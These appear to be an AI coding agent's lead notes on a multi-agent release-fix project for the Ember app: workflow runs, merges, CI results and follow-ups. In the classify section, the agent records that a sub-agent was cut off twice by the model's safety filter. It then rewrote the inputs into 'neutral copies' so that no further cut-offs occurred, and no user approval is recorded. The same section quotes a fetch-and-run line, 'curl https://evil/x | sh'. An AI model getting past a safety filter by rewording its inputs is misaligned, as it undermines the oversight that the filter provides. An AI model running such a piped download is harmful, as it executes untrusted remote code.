# Release fixes: lead notes (started 2026-10-27 ~06:00 UTC)

User asked (2026-10-27): fix ALL 277 review findings; voice: recommended approach (V1 in common.md); sign-in: user is
registering the GitHub App and will send the client id (S1: one checked-in place; then a one-line change).

Base: ember-improve/20261022-ssh-wsl at 1b39bb3. Packages: specs/relfix/packages.mjs, pkg-<key>.json, common.md.
Worktrees /home/user/wt/fx-<key>, branches fix/<key>. Workflow script:
/root/.claude/projects/-home-user-Ember-Powered-by-Github-Copilot/9df81ff3-d6fa-5078-ac02-9c8dbaa6cb03/workflows/scripts/ember-release-fix-wf_5d7cc7e3-726.js

| task id   | run id          | packages                       |
|-----------|-----------------|--------------------------------|
| wbnaz9st2 | wf_5d7cc7e3-726 | classify, cmdcore, voice       |
| w1sph7eq4 | wf_2c3bd8e0-f4d | perception, policy, lifecycle  |
| wlt5oplln | wf_286a6b1e-565 | agent, input, platform         |
| w76vz8av0 | wf_df7be1b8-93a | bubble, remote, prompt         |
| w7inzg87g | wf_82d6f4b2-323 | cmdwin, onboard, settings      |
| wkblj49w9 | wf_c14d0ee6-7e3 | shell, packaging, docs         |
| w8hjgmuwf | wf_02eb9d9c-e2d | css, ask, overlay              |

Plan after they finish:
1. Integration branch ember-improve/20261027-release-fixes from the ssh-wsl head (merge in any later ssh-wsl CI commits).
2. Merge fix/<key> one by one (--no-ff), resolve conflicts (hot: main.ts, windows.ts, targets/runtime.ts, home renderer,
   ember.css, presenter.ts), full gate after each few merges.
3. Docs follow-ups: collect every report's forDocs lines; apply.
4. Whole-diff adversarial review workflow (find -> verify) over base..integration; fix confirmed findings.
5. Full gate (tsc, lint, npm test, build, smoke, commands integration), push, dispatch ci.yml + remote.yml (via the
   -sshwsl-ci style branch name, or add the new branch to remote.yml's push triggers), iterate to green.
6. Report to the user: per-finding outcome table (fixed / not reproduced / left), CI status, what only real CI proves.

## GitHub App client id (from the user, 2026-10-27 ~06:05)
`Iv23liXa8A1wDXYg2jYw`. Added to common.md S1. At merge: make sure it sits in the agent package's checked-in place (else
set it there), and add a ci.yml step that POSTs https://github.com/login/device/code with it and expects a device_code
(proves the id is valid and device flow is enabled; this container's proxy blocks that endpoint, CI runners don't).
Can't verify from here whether Copilot accepts this app's user tokens: first real sign-in proves it.

## SSH/WSL CI state (06:35)
remote.yml run 12 green on every job (WSL1: WSL 16/16, PowerShell 8/8, Windows SSH 6 passed + the hello test's WSL1
refusal branch; WSL2 16/16). ci.yml run 138 green (Windows needed one re-run: win32-desktop foreground timing and an
Electron 0xc0000005 in win32-system, both flakes in port tests unrelated to SSH/WSL).
Still untested: a real-kernel Windows->remote hello (idea: sshd in the WSL2 job after its WA tests). The macOS commands
and SSH job never ran (dispatch/schedule only): now on push too (commit after 8df102b); read its first run.

## ssh-wsl commits after the fix base 1b39bb3 (merge them into the integration branch first)
57e29a8 accept-new first connect (WSL1 job); 4a70d2b remote parts in WSL1 job; 8df102b ssh-windows hello/refusal;
8b7fe3b macOS job on push; 5556bcd BSD script stdin fix (REAL macOS bug: every command failed to start on a Mac:
script's tcgetattr on Node's socket stdin -> EOPNOTSUPP); 63b88cd dnf --nobest (Rocky mirror skew).
Conflict watch: app/main/commands/run/{local,shells}.ts (cmdcore/cmdwin may touch), .github/workflows/*.yml (packaging).

## SSH/WSL branch fully green at 63b88cd (07:20)
remote.yml run 14: all 11 jobs green, incl. the first macOS job (commands-flow-local 17/17, commands-local macOS 4/4,
remote-ssh 11 + 1 skipped). ci.yml run 139: all jobs green first time. Remaining known gap: a real-kernel
Windows->remote hello (WSL1 is refused by the 4.18 gate, correctly).

## PAUSED by the user at ~07:25 UTC ("pause all agents as we are hitting limits")
All 7 workflows stopped (TaskStop). No scheduled check-ins pending. Committed work per package (commits since 1b39bb3 /
uncommitted files left by the stopped agents): classify 3/0, cmdcore 12/0, voice 15/2, perception 17/0, policy 25/0,
lifecycle 15/0, agent 27/0, shell 10/0, packaging 18/0, docs 17/1, bubble 26/0, cmdwin 20/0, prompt 12/1, onboard 22/0,
settings 18/0, css 12/3, remote 15/0, ask 17/3, overlay 15/0, input 8/0, platform 15/4.
To resume (when the user says so): re-invoke each workflow with
  Workflow({scriptPath: <script above>, resumeFromRunId: <run id>, args: <same packages>})
Completed agents replay from cache; stopped ones restart and should first look at their worktree's commits and
uncommitted files (git status) before redoing anything. Consider running fewer at once (limits): e.g. 3 workflows.

## Backed up to GitHub (user asked, ~07:35)
21 branches ember-improve/20261027-fix-<key> = local fix/<key> tips (verified equal). Review material + fix plan + WIP
patches: ember-improve/20261027-release-review at 40ab1b8 (docs/release-review/, based on ssh-wsl 63b88cd; worktree
/home/user/wt/relreview). WIP patches also in scratchpad/relfix-wip/. Uncommitted edits still sit in the six worktrees.

## RESUMED 2026-10-28 ~18:35 UTC (user: "Continue the work"), 3 workflows at a time (limits)
Freed disk (old port-phase scratch dirs, big repro files, stale verifier worktrees): 3.0G -> 9.9G free. Added a
"Resuming after a pause" section to common.md (prompts unchanged, so finished agents replay from cache).
Wave A now: w819r3e04 = wf_5d7cc7e3-726 (classify, cmdcore, voice); wpnr6aqwd = wf_2c3bd8e0-f4d (perception, policy,
lifecycle); wr57yxy5z = wf_286a6b1e-565 (agent, input, platform).
Wave B after any of those finishes (one at a time): wf_df7be1b8-93a (bubble, remote, prompt), wf_82d6f4b2-323 (cmdwin,
onboard, settings), wf_c14d0ee6-7e3 (shell, packaging, docs), wf_02eb9d9c-e2d (css, ask, overlay).

## Done: wr57yxy5z (agent, input, platform), ~18:50 UTC 10-28
agent 21 fixed + #147 partial (code comment fixed; docs/DEVELOPING.md:131 "failed card stays until you close it" left
for docs: fix at merge). GITHUB_CLIENT_ID = "Iv23liXa8A1wDXYg2jYw" in app/main/agent/github-app.ts. #138 now also
renews expiring GitHub App tokens (refresh_token grant, no client secret for device-flow tokens per GitHub docs).
input 6/6, platform 7/7, all verified + repaired. Full tests green (two timing tests flaked under load, pass alone).
CI-only: device flow enabled for the app; Copilot accepting ghu_ tokens; a real token renewal (~8 h).
Next started: wxmrsrimj = wf_df7be1b8-93a (bubble, remote, prompt).

## Done: w819r3e04 (classify, cmdcore, voice), ~19:15 UTC 10-28
cmdcore 9 fixed + #27 partial; all checks incl. commands integration green. voice 9 fixed + #255, #260 partial; all
checks + real-model suite green. classify: only 4 of 13 done (round 1), the agent was cut off twice by the model's
safety filter (attack-style examples in the findings: "evil" hosts, curl https://evil/x | sh); round 1 also opened 4
regressions (bazel run args, cmake -P args/-D, cmake -E tar --files-from, defaults path domain skips LSQuarantine) +
runners() makes `mise trust` ask. Round 3: neutral copies of the inputs (pkg-classify-neutral.json,
classify-verifier-neutral.txt), brief classify-round3.md, workflow wkjc04gji = wf_09d717dd-7c9 (steps A-E sequential,
verify, repair). Started wf_82d6f4b2-323 (cmdwin, onboard, settings) = w9utun6vx.
Still queued: wf_c14d0ee6-7e3 (shell, packaging, docs), wf_02eb9d9c-e2d (css, ask, overlay): start one per finish.

## Done: wxmrsrimj (bubble, remote, prompt), ~19:40 UTC 10-28
bubble 23 fixed + #14 partial (follower still parks for unsolicited offers; expiry 25 s bounds it); remote 10 + #195
partial (WSL offer only when the user names a listed distro; no launch-time discovery); prompt 8/8. All verified +
repaired, full gates green; targets-runtime.test.ts timed out 3x under load (passes alone 96/96): watch at merge.
Started wfsgwzwpj = wf_c14d0ee6-7e3 (shell, packaging, docs). Queued: wf_02eb9d9c-e2d (css, ask, overlay).

## Done: wpnr6aqwd (perception, policy, lifecycle), ~20:05 UTC 10-28
perception 11/11 (incl. UIA offscreen walk, Win/mac secret-name guard, secret vocab, RangeError), policy 15 + #116
partial, lifecycle 13/13. All verified + repaired; full gates green (voice-bzip2 timed out once under load, passes alone).
Started wtkxkt0pt = wf_02eb9d9c-e2d (css, ask, overlay): the last queued workflow.
Running: w9utun6vx (cmdwin, onboard, settings), wfsgwzwpj (shell, packaging, docs), wkjc04gji (classify round 3).

## Done: wfsgwzwpj (shell, packaging, docs), ~20:05 UTC 10-28
shell 5 fixed + #177, #245 partial; packaging 13/13; docs 12/12. All verified + repaired. Shell's full runs had
timeouts at load ~33 in untouched files (pass alone / with longer timeout).
#177 left (design change, follow-up after merge): RunAsNode fuse still on, because the macOS AX sidecar host (and on
Windows the job host, askpass, WSL launcher) start Ember's binary with ELECTRON_RUN_AS_NODE; a same-user process can
do the same and borrow Ember's TCC grants. Proposal: move those launches to utilityProcess.fork (or a separately
signed helper), then RunAsNode:false. Hardened runtime + entitlements are done.
#245 left: the frameless handle has no GTK dark variant (no title bar, so nothing visible).
Running: w9utun6vx (cmdwin, onboard, settings), wtkxkt0pt (css, ask, overlay), wkjc04gji (classify round 3).

## Done: wtkxkt0pt (css, ask, overlay), ~20:30 UTC 10-28
css 10 + #57 partial (text size setting done; see report), ask 14 + #75/#78/#45 partial, overlay 11/11; all verified +
repaired, full gates green.
Follow-ups after merge (decide/do in the integration phase):
- #75 handle position: add "Handle position" (bottom right / bottom left) in settings.ts, read by HandleWindow.corner(),
  the overlay card stack (#126 anchors bottom-right) and home copy; plus "Move to the other side" in the handle menu.
- #78 typed-ahead hold on Windows/macOS: probes added to ember-win32/ember-darwin integration suites; read their CI
  output, then either add a native hold or document "let go of the keys before typing".
- #45(b) remappable shortcuts + automatic fallback chord + launcher Ask entries (Windows jump list, .desktop Actions).
- #177 RunAsNode (see shell). #147 DEVELOPING.md:131 line. #14 parking for unsolicited offers (bounded by 25 s).
Running: w9utun6vx (cmdwin, onboard, settings), wkjc04gji (classify round 3).

## Done: w9utun6vx (cmdwin, onboard, settings), ~20:40 UTC 10-28
cmdwin 19 + #46/#263 partial, onboard 11 + #95 partial, settings 22/22; all verified + repaired, gates green.
20 of 21 packages done (classify round 3 still running: steps A, B done, C underway; 15 new commits, no cut-offs).

## MERGE PHASE started ~20:45 UTC 10-28
Dry run: 17 of 20 merges conflict (main.ts, windows.ts, targets/runtime.ts, home renderer, COMMANDS-WSL-SSH.md...).
Integration branch ember-improve/20261027-release-fixes at 63b88cd, worktree /home/user/wt/relfix-int.
Reports per package: specs/relfix/reports/<key>.json; merge brief specs/relfix/merge.md.
Merge chain wbqikdkej = wf_c2ead24a-14b: one agent per package (lifecycle, input, perception, policy, agent, platform,
voice, cmdcore, cmdwin, prompt, remote, bubble, onboard, settings, css, ask, overlay, shell, packaging, docs), gate
every 5 merges + final (with commands integration). classify merges after its round 3 + verify finish.

## classify round 3 done (wkjc04gji), ~21:30 UTC 10-28
35 commits on fix/classify; all 13 ids fixed per the steps/repair; verify (before repair) had 12 problems (6 must),
repair fixed them; checks green (605 commands tests, full 5973, build, commands integration 33). No cut-offs with the
neutral brief. Re-verify launched: wmfys3fzd = wf_17144f76-a6f (verify2 + repair2), input
reports/classify-round3-verify.json. Then update reports/classify.json and merge classify last into relfix-int.

## classify re-verified (wmfys3fzd), ~21:50 UTC 10-28
No problems; all 13 ids verified fixed; 2955-case corpus diff vs base: zero ask->run, one intended run->ask.
fix/classify at 2aa2537 is ready. reports/classify.json updated. Merge it after the chain (wbqikdkej) ends, then a
final gate (full + commands integration).

## Container restart ~22:xx UTC 10-28: merge chain wbqikdkej stopped mid-bubble
Committed: 11 merges (lifecycle..remote) + gate fix e960ef6; gates after 5 and 10 merges green (second: 0 fixes).
Aborted the half-done bubble merge; resuming wf_c2ead24a-14b (cached steps replay).
Open interaction notes from merge agents (handle in the final cross-review/follow-ups):
- lifecycle #91 x cmdwin #262: a crashed command-window page is destroyed without the close guard, so a running
  command carries on with no window until the next card/run/prompt. REAL: fix after merge.
- platform: GrantKeeper renewal + device-flow save still use synchronous safeStorage.encryptString (macOS keychain
  prompt on the main thread). Pre-existing pattern; consider async.
- input: keys-only borrow under Typing Assist brings the target to the front before keys() refuses (no key sent).
- lifecycle: app/remote/audit.ts createRemoteAudit prune shares the try with new AuditLog().
- prompt: consent-direct card refused for no window ends as 'Not now.' (pre-existing).
- remote x bubble: registry.ts notConnectedWhy / lost reason: keep remote #197's plain wording (no tool names).
- flake: test/unit/desk-live.test.ts counts machine-wide /tmp/.X11-unix.
Reset relfix-int to 5421794 (merge --abort refused). Backups refreshed: all 21 fix/* (classify at 2aa2537) and
ember-improve/20261027-release-fixes at 5421794 on GitHub. Merge chain resumed: wpf51x0xt (same run id).

## ALL 21 MERGED: ember-improve/20261027-release-fixes at 3d80b0c (~01:00 UTC 10-29)
Merge chain finished (wpf51x0xt): 20 merges + 4 gates, final gate green (tsc, lint, 7177 tests twice, build, smoke).
classify merged by the lead: 1 conflict (ls/du/tree handler: cmdwin #214 wording + classify's tree --fromfile read),
4 new classify lines reworded to #214's words, #214 test example changed from `ls $(pwd)` (now resolved) to
`ls $(cat names.txt)`. Gate on 3d80b0c: tsc, lint, 7192 tests, build, smoke 2/2, commands integration 33. Pushed.
CI started: ci.yml dispatched on ember-improve/20261027-release-fixes; remote.yml via push of the same commit to
ember-improve/20261022-sshwsl-release (its push trigger).
Merge agents' notes to handle in follow-ups: announcement wording (bubble #22 "a few seconds" vs cmdwin #46 real time +
stop chord: check what the merge chose); notConnectedWhy new combined sentence; greet-reason order (lockdown first);
duplicate imports in doctor.ts/home main.ts; terminal font doesn't scale with text size (css proposal); forced-colours
drops onboard's sticky Start-row cover; DEVELOPING.md lines (More time to read; remote.yml macOS on every push;
#147 failed card); packaging update restart uses app.relaunch() without restartOptions (AppImage); card buttons'
min-heights don't grow with text size; stale JSDoc host.ts:109; remote.yml macOS trigger kept on every push.
Cross-review launched: w17a0uese = wf_339e3a09-31f (6 finders: safety, bubble, lifecycle, perception, agent, ship;
one skeptic per finding).

## CI round 1 on the merged release fixes (2026-10-29)
ci.yml run 140 (3d80b0c): Linux, RHEL 8, evaluation, packaging green; macOS and Windows red.
- macOS darwin-system "German names": System Settings had no "systemeinstellungen" (Calculator fine). localizedNames
  stopped at the loctable's German entry even when it had no names; now merges that entry with
  <lang>.lproj/InfoPlist.strings (unit test added). The integration test now prints the bundle's layout on a miss
  (Info.plist names, loctable languages/German keys, de.lproj files) in case that wasn't the cause. ca2af42.
- Windows uia-bridge long list (review #1 test, new from fix/perception): 3000-row WinForms ListView, snapshot 4016 ms,
  1 node, cut time, busy. Cause predates the fixes: the two-level prefetch cached ~45 properties of every row through
  the Win32 ListView proxy (a message per property). Bridge now counts each level with a slim two-level read; past 400
  elements reads only what shows in full (FindAll IsOffscreen=false), lists 50 offscreen children (each refreshed
  alone) and cuts the rest "offscreen". PROTOCOL.md and fake.ts (uia only) follow; host test added. 58a2010.
  Not compiled locally (no C# compiler here): Windows CI compiles it.
- Windows win32-vocabulary: test predated #110 (untyped/unsure); updated to the new verdicts. e426ecc.
- Windows ember-win32 #78 probe: electron.launch timed out; app folder argument "D:\...\" ended in a backslash that
  escaped the closing quote. root path.resolve'd. e426ecc.
Gate: tsc, lint, npm test 7194 passed / 8 skipped, build. Pushed e426ecc to release-fixes and sshwsl-release.
remote.yml: the push that created sshwsl-release at 3d80b0c started no run (no new commits on a new branch: empty
diff for the path filter). workflow_dispatch on a non-default branch DOES work (204) — dispatched remote.yml on
sshwsl-release and ci.yml on release-fixes.

## CI round 2 (e426ecc): ci.yml 141 red (macOS, Windows), remote.yml 15 red (2 of 14 jobs)
- macOS darwin-system: the diagnostic showed System Settings' loctable German CFBundleName is "System­einstellungen"
  (soft hyphen). Names now folded without \p{Cf} in keywords, programs and appKey. 0d2717a.
- Windows unit (ci 141 perception-windows; remote 15 remote-capture, remote-perception): 15 s timeouts in the tests that
  composite marks (SVG text): the first text sharp draws builds fontconfig's cache (2 s in run 140, >15 s here). vitest
  globalSetup test/warm-text.ts draws text once first. 83c1512. PRODUCT FOLLOW-UP: the first marked screenshot on a fresh
  Windows machine pays the same (seconds to tens of seconds); consider warming sharp's text at startup on win32.
- Windows ember-win32 in ci 141: "app was busy" on the bench read: knock-on (npm test failed, so the bridge-compile step
  that caches the DLL was skipped; the first compile happened inside the test). Bridge C# compiled (else "helper not
  running"). Re-check in round 3.
- remote 15 ssh-el8-client (OpenSSH 8.0): password card "other", not "password": remote package's intended fix (before 8.5
  every secret is the host's quoted question). Test now follows ssh -V. bbe8ab2.
- Also pushed: 71d6b0a (command window revives a crashed page: lifecycle #91 x cmdwin #262), abe10c0 (duplicate imports,
  JSDoc), 4e47b13 (ci.yml device-code check of the built-in client id; startDeviceFlow refuses an answer without codes;
  DEVELOPING.md Connecting Copilot).
Gate: tsc, lint, npm test 7197 passed / 8 skipped, build. Pushed bbe8ab2 to both branches; remote.yml 16 (push) and ci.yml
dispatched.

## CI GREEN on bbe8ab2 (02:08 UTC 10-29): ci.yml run 142 all jobs (macos-x64 skipped: default branch only), remote.yml run 16
all 14 jobs.
- uia-bridge long list: 2310 ms, 117 nodes, 50 offscreen, cut ["offscreen"], rows through "Row 3000" shown (was 4016 ms,
  1 node, busy). Bridge C# compiled on Windows (its own step green).
- Device-code step: "GitHub answered 200: a device code (not shown)": the built-in client id Iv23liXa8A1wDXYg2jYw works.
- #77: bench active true, ask box hidden after the click: fixed on real Windows.
- #78 probe: Windows loses 1 of 15 letters typed straight after the ask chord ("uick brown fox"), macOS 3 of 15 ("ck
  brown fox"). DECISION NEEDED (owner): native typed-ahead hold vs document + faster focus. Recommendation: no global
  keyboard hook (AV/privacy, Input Monitoring on macOS); document it and cut the focus latency.
- darwin-system German names: green (soft hyphen folded).
Container restart ~03:xx UTC 10-29: both workflows stopped. Round 2 had 6 fixes, 6 verifies, 3 repairs done (css2's repair
mid-edit, 4 files uncommitted); decisions had both fixes + runasnode2's verify. Resumed: weyqk13kv (same run wf_b411fa44-ea2),
wciaao8q6 (same run wf_d867e569-0a4). fix2/* backed up as ember-improve/20261029-fix2-<key>.

## Decisions workflow done (wciaao8q6, ~06:45 UTC 10-29): results in specs/relfix2/decisions-results.json
- runasnode2 948a286 (8 commits): macOS AX host via utilityProcess.fork (parent-port messages in, stdout out); askpass on
  macOS = Ember with --ember-askpass (prompt via EMBER_ASKPASS_PROMPT, worker thread + Atomics.wait, no run loop/Dock
  icon, setActivationPolicy prohibited); fuses per OS (RunAsNode off on macOS only); ci.yml macos/macos-x64 prove node
  mode refused; new askpass-darwin integration test + step. 5 should-fix from verifier, repaired. 7 forDocs.
- typeahead2 51c3825 (6 commits): box shows before the screen read on Win/mac, keeps letters typed into it, first-run
  hint, probe logs ask.keyboard ms; WSLg never-look naming kept. 3 should-fix, repaired. 3 forDocs.
CI dispatched on both branches (ember-improve/20261029-fix2-*): ci.yml x2, remote.yml on runasnode2.
CI on the decision branches: ci.yml 143 (runasnode2 948a286) all green, ci.yml 144 (typeahead2 51c3825) all green,
remote.yml 17 (runasnode2) all green. Evidence: macOS fuses "RunAsNode off"; "Node mode refused: Ember started as
itself, refused --inspect (exit 2) and left no mark"; packaged AX host as utility process, helper row ok; askpass-darwin
dev + cancel: ssh-add unlock/locked, LaunchServices never Foreground, one askpass process. Typed-ahead: Windows box has the
keyboard at 25 ms (1 of 15 lost: typed before), macOS at 49 ms (1 of 15 lost, base 3). Intel Mac run dispatched
(only=macos, intel=true) on runasnode2: macos-x64 packaged check is the one part not yet seen.
ci.yml 145 (runasnode2, only=macos, intel=true): macos and macos-x64 green; Intel packaged check "node mode refused,
NODE_OPTIONS fuse off, --inspect refused" passed. runasnode2 proven on every OS: ready to merge after round 2's merges.
Round 2 workflow at docs2 (07:28 UTC).

## Round 2 DONE (weyqk13kv, ~08:40 UTC 10-29): merged into relfix-int at 9912de5, final gate green (330 files, 7352
tests, build, smoke 2/2, commands integration). Results: specs/relfix2/round2-results.json. All items fixed except:
F-116-quotes partial (whole typed text never shown before Allow), F-57-left partial (Ask box, desk bar), F-notconnected /
F-greet / F-cmds41 not reproduced (already right). Final review: 1 minor (stale unasked SSH offer behind a held bubble).
Pushed 9912de5 to release-fixes + sshwsl-release; ci.yml dispatched (all + intel).
Round 3 workflow wtrnup8ek = wf_b5042874-fdb: merge in runasnode2 + typeahead2 (+ their forDocs), gate; packages offer3,
confirm3 (whole typed text before Allow: lead's decision, as command cards), textsize3, handle3 (D-75), shortcuts3
(D-45b); merges; final gate + 3 adversarial reviews (safety, ux, platform) over 1b39bb3..HEAD. Specs: specs/relfix3/.
CI on 9912de5: ci.yml 146 red only in the checks job's integration tests (worker-safety SEC8-2 pin predates #116's
quoting: stale), remote.yml 18 red only in WSL1's first PowerShell run (UTF-8 test timed out at 15 s; cold start; no
change to that path since green runs 15-17). Fixes on fix3/ci-tests (from 9912de5): pin updated (worker-safety 93/93 here),
Windows block warms PowerShell in beforeAll. MERGE fix3/ci-tests after round 3. Also: run `EMBER_INTEGRATION=1 npx vitest
run test/integration/worker-safety.test.ts` (and the checks job's integration list) in the final local gate: confirm3
changes the same question text.

## 2026-10-29 round 4 launched
- fix3/ci-tests merged as 0866316, pushed. ci.yml run 147 (all+intel, id 40886987375) and remote.yml run 19 (id 40886993426) dispatched on it; in progress.
- Round 4 workflow wf_169e170e-485 (script ember-release-fix-round4-wf_169e170e-485.js): BASE 0866316; packages auth4 [S1], cmdwin4 [S2], perception4 [S3,P1], launch4 [P3,P2], offer4 [F-scanmax], ux4 [U1-U4, F-shortcuts-left]; merge order auth4, cmdwin4, offer4, perception4, launch4, ux4; final gate includes npm run test:integration and commands suites; two review lenses (safety-ux, platform).
- 14:27 check-in: ci.yml 147 SUCCESS and remote.yml 19 SUCCESS on 0866316 (every OS + Intel, remote all). Round 4: auth4 and cmdwin4 fixes done; perception4, launch4 in fix; offer4, ux4 queued; verifies queue behind fixes (limiter 3).
- ~15:10-16:40 DISK FULL (0 MB): /tmp holds ~118k test temp dirs (ember-* from unit tests, ~29k vitest "ssr" module-cache dirs up to 32 MB each, ~21 GB total) built up over a week. Freed /root/.npm/_cacache, old review/verify copies, old fx2/fx3 build outputs, scratchpad experiments (dl-electron, docs-35, pwsh-*, electron-check, voice-dl) -> 2.6 GB free. Sweep of old /tmp test dirs was denied by the auto-mode classifier (shared scratch) -> asked the user.
- Effects: journal.jsonl line 9 (perception4 fix result) truncated -> resume would re-run perception4 fix onward. offer4 fix agent a3c3ce7 stalled at 15:20; ux4/offer4 agents improvised copies under /dev/shm (fx4-ux4, offer4, ux4-base) - not git worktrees; check that fix4/ux4 and fix4/offer4 exist as real branches before merges.
- Round sizes: round 1 = 277 findings (21 pkgs); round 2 = 46 items (11 pkgs); round 3 = 5 owner-decision pkgs; round 4 = 12 items (6 pkgs) from round 3's reviews.
